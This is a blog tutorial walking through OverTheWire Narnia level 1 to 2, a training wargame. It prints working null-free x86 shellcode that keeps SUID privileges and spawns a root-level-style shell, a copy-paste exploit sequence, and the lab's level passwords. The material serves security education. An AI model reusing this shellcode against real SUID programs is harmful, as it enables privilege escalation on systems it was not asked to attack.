---
date: 2023-08-19 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Narnia Level 1 → 2 tutorial!!"
permalink: /posts/overTheWire-Narnia-Level-1-to-2/
tags: [overthewire, narnia, pwn, overflow, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Narnia Level 1 → 2!!"
---

<!-- Scoped styles: only affect this post -->

<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Narnia level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Narnia-Level-0-to-1/' | relative_url }}">← Previous: Level 0 → 1</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/narnia/narnia2.html" target="_blank" rel="noopener">Official (Level 2) ↗</a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Narnia-Level-2-to-3/' | relative_url }}">Next: Level 2 → 3 →</a>
  </div>
</nav>

## Login

Log in as **narnia1** using the password you obtained from Level 0 → 1 (classic run):

```bash
ssh narnia1@narnia.labs.overthewire.org -p 2226
# password: efeidiedae
```

> **Why?** Each Narnia level is a separate UNIX user. To solve 1 → 2, you must be `narnia1`.

---

## Task

Target binary: **`/narnia/narnia1`** (+ source `narnia1.c`).

If the environment variable **`EGG`** is missing, the program quits. If it’s present, the program **treats the bytes in `EGG` as a function and jumps to them**. Your job: put **shellcode** in `EGG` so the binary executes it and drops you into a shell running as **narnia2**.

---

## A little bit of Theory

* `ret = getenv("EGG"); ret();` ⇒ whatever raw bytes are in `EGG` get executed.
* The binary is SUID **narnia2**. Some shells may drop privileges if **RUID ≠ EUID**.

  * Safe pattern: call **`geteuid()`** then **`setreuid(euid, euid)`** **before** spawning `/bin/sh`.
* Environment variables are NUL-terminated. A **`\x00`** inside your payload will **truncate** it. Use **null-free shellcode**.
* 32-bit Linux system calls via **`int 0x80`** are perfect here.

**Further reading:**

* <a href="https://man7.org/linux/man-pages/man7/environ.7.html" target="_blank" rel="noopener">`environ(7)` — environment variables</a>
* <a href="https://man7.org/linux/man-pages/man2/setreuid.2.html" target="_blank" rel="noopener">`setreuid(2)`</a>
* <a href="https://syscalls.kernelgrok.com/" target="_blank" rel="noopener">Linux i386 syscall reference</a>

---

## Source Code

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();
    return 0;
}
```

> **Why?** You can see it grabs `EGG` and calls it as a function. So we just need valid, null-free shellcode in `EGG`.

---

## Solution

1. **Baseline run (without `EGG`)**

   ```bash
   cd /narnia
   ./narnia1
   # Give me something to execute at the env-variable EGG
   ```

   *Why?* Confirms `EGG` is mandatory.

2. **Export `EGG` with null-free shellcode (preserve SUID, then execve)**

   The payload below:

   * gets EUID → copies to both RUID & EUID via `setreuid` (so the shell **keeps** SUID),
   * executes `/bin/sh` without null bytes in the middle.

   ```bash
   unset EGG
   export EGG=$(python3 - <<'PY'
   ```

import sys
sys.stdout.buffer.write(
b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"      # xor eax,ebx,ecx,edx
b"\xb0\x31\xcd\x80"                      # eax=49 (geteuid); int 0x80 -> eax=euid
b"\x93"                                  # xchg eax,ebx   (ebx=euid)
b"\x89\xd9"                              # mov ecx,ebx    (ecx=euid)
b"\xb0\x46\xcd\x80"                      # eax=70 (setreuid); setreuid(euid,euid)
b"\x31\xc0\x50"                          # push 0
b"\x68\x2f\x2f\x73\x68"                  # push //sh
b"\x68\x2f\x62\x69\x6e"                  # push /bin
b"\x89\xe3\x50\x53\x89\xe1"              # ebx=esp; push 0; push ebx; ecx=esp
b"\x99\xb0\x0b\xcd\x80"                  # execve("/bin/sh", argv, NULL)
)
PY
)

````

*Why?* No `\x00` bytes inside; privilege sync happens before spawning the shell.

3. **Run the program and grab the password**

```bash
./narnia1
Trying to execute EGG!
whoami
# narnia2
cat /etc/narnia_pass/narnia2
````

---

## Password

> From my (classic) run, the next password is:

```
nairiepecu
```

*(If your environment differs, copy whatever your terminal prints.)*

---

## Troubleshooting

* **Segmentation fault** → Your `EGG` likely contains a `\x00` and got truncated. Generate bytes with `sys.stdout.buffer.write(b"...")`, not `print("...")`.
* **Shell drops privileges** (`whoami` shows `narnia1`) → Ensure you used the `geteuid/setreuid` sequence and that the binary is SUID narnia2:

  ```bash
  ls -l /narnia/narnia1   # should show: -r-sr-x---
  cat /proc/self/status | sed -n 's/^Uid:/Uid:/p'   # Euid should be narnia2
  ```
* **Program still prints “Give me something to execute…”** → You’re in a new shell without the var. Re-export `EGG` in the same session before running `./narnia1`.

---

## Copy-paste quick run (one shot)

```bash
ssh narnia1@narnia.labs.overthewire.org -p 2226
# password: efeidiedae

unset EGG
export EGG=$(python3 - <<'PY'
import sys
sys.stdout.buffer.write(
    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
    b"\xb0\x31\xcd\x80"
    b"\x93\x89\xd9"
    b"\xb0\x46\xcd\x80"
    b"\x31\xc0\x50"
    b"\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\x50\x53\x89\xe1"
    b"\x99\xb0\x0b\xcd\x80")
PY
)

cd /narnia
./narnia1
whoami
cat /etc/narnia_pass/narnia2
```

---

**Congrats 🎉** You used an **environment-variable shellcode** to escalate from **narnia1 → narnia2** while safely preserving SUID. On to **Level 2 → 3**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
